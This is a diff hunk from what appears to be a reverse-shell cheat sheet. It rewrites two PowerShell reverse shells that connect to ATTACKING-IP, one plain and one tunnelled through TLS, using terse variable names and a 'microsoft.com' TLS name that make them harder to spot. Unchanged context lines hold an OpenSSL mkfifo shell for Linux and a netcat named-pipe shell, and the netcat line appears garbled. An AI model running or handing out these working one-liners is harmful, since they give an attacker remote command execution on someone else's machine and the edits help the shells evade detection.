@@ -67,10 +67,10 @@ OpenSSL Linux:
 mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <ATTACKING-IP>:<PORT> > /tmp/s; rm /tmp/s
 
 OpenSSL Windows via PowerShell:
-$socket = New-Object Net.Sockets.TcpClient('ATTACKING-IP', 443);$stream = $socket.GetStream();$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));$sslStream.AuthenticateAsClient('fake.domain');$writer = new-object System.IO.StreamWriter($sslStream);$writer.Write('PS ' + (pwd).Path + '> ');$writer.flush();[byte[]]$bytes = 0..65535|%{0};while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data | Out-String ) 2>&1;$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
+"$a=New-Object Net.Sockets.TcpClient('ATTACKING-IP',443);$b=$a.GetStream();$c=New-Object System.Net.Security.SslStream($b,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]));$c.AuthenticateAsClient('microsoft.com');$d=new-object System.IO.StreamWriter($c);$d.Write('# ');$d.flush();[byte[]]$bytes=0..65535|%{0};while(($i=$c.Read($bytes,0,$bytes.Length)) -ne 0){$g=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$f=(iex $g|Out-String) 2>&1;$h=$f+'# ';$e=([text.encoding]::ASCII).GetBytes($h);$c.Write($e,0,$e.Length);$c.Flush()}"
 
 PowerShell:
-powershell -noexit -ExecutionPolicy Unrestricted "$client = New-Object System.Net.Sockets.TCPClient('ATTACKING-IP',443);$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length)}"
+powershell -noexit -ExecutionPolicy Unrestricted "$a=New-Object System.Net.Sockets.TCPClient('ATTACKING-IP',443);$b=$a.GetStream();[byte[]]$bytes=0..255|%{0};while(($i=$b.Read($bytes,0,$bytes.Length)) -ne 0){;$c=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$d=(iex $c 2>&1|Out-String );$e =$d+'# ';$f=([text.encoding]::ASCII).GetBytes($e);$b.Write($f,0,$f.Length)}"
 
 NetCat Linux without -e Flag:
 rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 443 0/tmp/p
